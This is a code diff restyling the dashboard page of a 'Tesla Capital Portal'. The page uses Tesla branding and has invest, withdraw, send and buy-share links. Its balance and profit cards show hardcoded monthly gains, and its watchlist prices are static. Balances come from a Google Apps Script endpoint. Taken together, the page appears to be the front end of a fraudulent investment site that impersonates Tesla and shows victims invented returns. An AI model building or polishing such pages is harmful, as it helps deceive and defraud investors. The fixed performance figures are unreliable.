@@ -5,88 +5,116 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tesla Capital Portal - Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .gradient-card { background: linear-gradient(135deg, #e82127 0%, #901115 100%); }
     </style>
 </head>
 <body class="text-white min-h-screen pb-24">
 
-    <!-- Header Navigation -->
-    <header class="flex items-center justify-between px-6 py-4 border-b border-[#222] bg-[#141414] sticky top-0 z-50">
-        <div class="flex items-center space-x-2">
-            <svg class="w-8 h-8 text-[#E82127] fill-current" viewBox="0 0 24 24">
-                <path d="M12 2L2 4.5v2L12 9l10-2.5v-2L12 2zm0 8.5L3 8v6.5c0 3 4 5.5 9 6.5 5-1 9-3.5 9-6.5V8l-9 2.5z"/>
-            </svg>
-            <span class="font-semibold tracking-tight text-sm uppercase">Tesla Hub</span>
+    <!-- Top Premium Navigation -->
+    <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d] sticky top-0 z-50">
+        <div class="flex items-center space-x-3">
+            <span class="text-xl font-bold tracking-widest text-[#E82127]">TESLA</span>
         </div>
         <div class="flex items-center space-x-4">
-            <div class="text-right">
-                <p class="text-xs text-[#888]">Account Manager</p>
-                <p class="text-xs font-medium text-emerald-400 flex items-center justify-end">
-                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 mr-1.5 animate-pulse"></span>Sarah Jenkins
-                </p>
+            <button class="text-neutral-400 hover:text-white">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+            </button>
+            <div class="relative">
+                <span class="absolute -top-1 -right-1 bg-[#E82127] text-[10px] w-4 h-4 rounded-full flex items-center justify-center font-bold">3</span>
+                <svg class="w-5 h-5 text-neutral-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/></svg>
+            </div>
+            <div class="flex items-center space-x-2">
+                <div class="w-8 h-8 rounded-full bg-neutral-800 border border-neutral-700 flex items-center justify-center text-xs font-bold text-neutral-300">PL</div>
             </div>
         </div>
     </header>
 
-    <!-- Main Content Grid -->
-    <main class="max-w-md mx-auto px-4 mt-6 space-y-6">
+    <!-- Main Container -->
+    <main class="max-w-md mx-auto px-4 mt-4 space-y-6">
         
-        <!-- Welcome Title -->
-        <div>
-            <h2 class="text-2xl font-bold tracking-tight">Welcome back, <span id="userName" class="text-neutral-300">Investor</span></h2>
-            <p class="text-xs text-[#888] mt-0.5">Track. Invest. Grow.</p>
-        </div>
-
-        <!-- Metric Balance Cards -->
-        <div class="space-y-4">
-            <!-- Total Balance Card -->
-            <div class="bg-[#141414] border border-[#222] rounded-2xl p-5 relative overflow-hidden">
-                <p class="text-xs font-medium uppercase tracking-wider text-[#888]">Total Balance</p>
-                <div class="flex items-baseline justify-between mt-2">
-                    <h3 id="totalBalance" class="text-3xl font-bold tracking-tight text-neutral-100">Fetching...</h3>
-                </div>
-                <p class="text-xs text-emerald-400 font-medium flex items-center mt-2">↑ 5.24% <span class="text-[#666] ml-1">vs last month</span></p>
-            </div>
-
-            <!-- Total Profit Card -->
-            <div class="bg-[#141414] border border-[#222] rounded-2xl p-5 relative overflow-hidden">
-                <p class="text-xs font-medium uppercase tracking-wider text-[#888]">Total Profit</p>
-                <div class="flex items-baseline justify-between mt-2">
-                    <h3 id="totalProfit" class="text-3xl font-bold tracking-tight text-neutral-100">Fetching...</h3>
-                </div>
-                <p class="text-xs text-emerald-400 font-medium flex items-center mt-2">↑ 8.45% <span class="text-[#666] ml-1">vs last month</span></p>
+        <!-- Welcome Hero Section -->
+        <div class="relative rounded-2xl overflow-hidden h-32 bg-neutral-900 flex items-end p-4 border border-[#222]">
+            <div class="absolute inset-0 bg-cover bg-center opacity-40" style="background-image: url('https://images.unsplash.com/photo-1617788138017-80ad40651399?auto=format&fit=crop&q=80&w=600');"></div>
+            <div class="absolute inset-0 bg-gradient-to-t from-black via-black/50 to-transparent"></div>
+            <div class="relative z-10">
+                <h2 class="text-xl font-bold tracking-tight">Welcome back, <span id="userName" class="text-neutral-100">Investor</span></h2>
+                <p class="text-xs text-neutral-400 mt-0.5">Track. Invest. Grow.</p>
             </div>
         </div>
 
-        <!-- Action Grid Layout -->
-        <div class="grid grid-cols-3 gap-3">
-            <a href="invest.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
-                <span class="text-lg mb-1">🏦</span><span class="text-xs font-medium tracking-wide">Invest</span>
+        <!-- Financial Dashboard Balance Interface -->
+        <div class="grid grid-cols-2 gap-4">
+            <!-- Balance -->
+            <div class="gradient-card rounded-2xl p-4 relative shadow-lg">
+                <p class="text-[10px] font-semibold uppercase tracking-wider text-red-200">Total Balance</p>
+                <h3 id="totalBalance" class="text-xl font-bold tracking-tight mt-1 text-white">Fetching...</h3>
+                <p class="text-[10px] text-red-200 font-medium mt-2 flex items-center">▲ 5.24% <span class="opacity-60 ml-1">vs last mo</span></p>
+            </div>
+
+            <!-- Profit -->
+            <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 shadow-lg">
+                <p class="text-[10px] font-semibold uppercase tracking-wider text-neutral-500">Total Profit</p>
+                <h3 id="totalProfit" class="text-xl font-bold tracking-tight mt-1 text-white">Fetching...</h3>
+                <p class="text-[10px] text-emerald-400 font-medium mt-2 flex items-center">▲ 8.45% <span class="text-neutral-600 ml-1">vs last mo</span></p>
+            </div>
+        </div>
+
+        <!-- Premium Navigation Matrix -->
+        <div class="grid grid-cols-3 gap-2.5">
+            <a href="invest.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Invest</span>
             </a>
-            <a href="withdraw.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
-                <span class="text-lg mb-1">🏧</span><span class="text-xs font-medium tracking-wide">Withdraw</span>
+            <a href="withdraw.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Withdraw</span>
             </a>
-            <a href="send.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
-                <span class="text-lg mb-1">🚀</span><span class="text-xs font-medium tracking-wide">Send</span>
+            <a href="send.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Send</span>
             </a>
-            <a href="buyshare.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
-                <span class="text-lg mb-1">📈</span><span class="text-xs font-medium tracking-wide">Buy Share</span>
+            <a href="buyshare.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Buy Share</span>
             </a>
-            <a href="receive.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
-                <span class="text-lg mb-1">📥</span><span class="text-xs font-medium tracking-wide">Receive</span>
+            <a href="receive.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Receive</span>
             </a>
-            <a href="bills.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
-                <span class="text-lg mb-1">🧾</span><span class="text-xs font-medium tracking-wide">Bills</span>
+            <a href="bills.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Bills</span>
             </a>
+        </div>
+
+        <!-- Futures & Watchlist Interface Module -->
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 space-y-4">
+            <h4 class="text-xs font-bold uppercase tracking-wider text-neutral-400">Futures & Watchlist</h4>
+            <div class="space-y-3">
+                <div class="flex items-center justify-between border-b border-neutral-900 pb-2">
+                    <div>
+                        <p class="text-sm font-bold">TSLA</p>
+                        <p class="text-[10px] text-neutral-500">Tesla, Inc.</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-sm font-bold text-neutral-200">$254.85</p>
+                        <p class="text-[10px] text-emerald-400 font-medium">+5.13%</p>
+                    </div>
+                </div>
+                <div class="flex items-center justify-between">
+                    <div>
+                        <p class="text-sm font-bold">NASDAQ 100</p>
+                        <p class="text-[10px] text-neutral-500">NQ FUT</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-sm font-bold text-neutral-200">18,892.25</p>
+                        <p class="text-[10px] text-emerald-400 font-medium">+0.51%</p>
+                    </div>
+                </div>
+            </div>
         </div>
 
     </main>
 
     <script>
         const API_URL = "https://script.google.com/macros/s/AKfycbx7Gg2ClxC7VdaDReZzI4jV_q8RKBDYPteFN526vQjmsxWSmGDQyy-NLkDXhivOHSh0Yw/exec";
-
-        // Safeguard routing check
         const userId = localStorage.getItem("userId");
         const fullName = localStorage.getItem("fullName");
 
@@ -97,23 +125,23 @@
             loadDashboardMetrics();
         }
 
+        function formatCurrency(val) {
+            const num = parseFloat(String(val).replace(/[^0-9.-]+/g,"")) || 0;
+            return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(num);
+        }
+
         async function loadDashboardMetrics() {
             try {
                 const response = await fetch(API_URL, {
                     method: "POST",
                     mode: "cors",
                     headers: { "Content-Type": "text/plain" },
-                    body: JSON.stringify({
-                        action: "getDashboardData",
-                        userId: userId
-                    })
+                    body: JSON.stringify({ action: "getDashboardData", userId: userId })
                 });
-
                 const result = await response.json();
-                
                 if (result.status === "success") {
-                    document.getElementById('totalBalance').innerText = result.account.balance;
-                    document.getElementById('totalProfit').innerText = result.account.profit;
+                    document.getElementById('totalBalance').innerText = formatCurrency(result.account.balance);
+                    document.getElementById('totalProfit').innerText = formatCurrency(result.account.profit);
                 } else {
                     document.getElementById('totalBalance').innerText = "Error";
                     document.getElementById('totalProfit').innerText = "Error";
